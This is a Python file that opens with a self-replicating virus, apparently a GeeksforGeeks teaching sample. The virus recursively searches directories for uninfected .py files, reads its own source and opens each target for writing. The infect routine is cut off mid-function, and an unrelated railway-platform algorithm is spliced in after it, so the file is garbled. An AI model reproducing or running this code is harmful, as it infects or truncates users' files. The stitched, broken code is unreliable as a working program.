#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Program to find minimum
# number of platforms
# required on a railway
# station
 
# Returns minimum number
# of platforms required
 
 
def findPlatform(arr, dep, n):
 
    # Sort arrival and
    # departure arrays
    arr.sort()
    dep.sort()
 
    # plat_needed indicates
    # number of platforms
    # needed at a time
    plat_needed = 1
    result = 1
    i = 1
    j = 0
 
    # Similar to merge in
    # merge sort to process
    # all events in sorted order
    while (i < n and j < n):
 
        # If next event in sorted
        # order is arrival,
        # increment count of
        # platforms needed
        if (arr[i] <= dep[j]):
 
            plat_needed += 1
            i += 1
 
        # Else decrement count
        # of platforms needed
        elif (arr[i] > dep[j]):
 
            plat_needed -= 1
            j += 1
 
        # Update result if needed
        if (plat_needed > result):
            result = plat_needed
 
    return result
 
# Driver code
 
 
arr = [900, 940, 950, 1100, 1500, 1800]
dep = [910, 1200, 1120, 1130, 1900, 2000]
n = len(arr)
 
print("Minimum Number of Platforms Required = ",
      findPlatform(arr, dep, n))
 
# This code is contributed
# by Anant Agarwal.
# Time Complexity: O(N*log(N)) - One traversal O(n) of both the array is needed after sorting O(N * log(N))
# Space Complexity: O(1)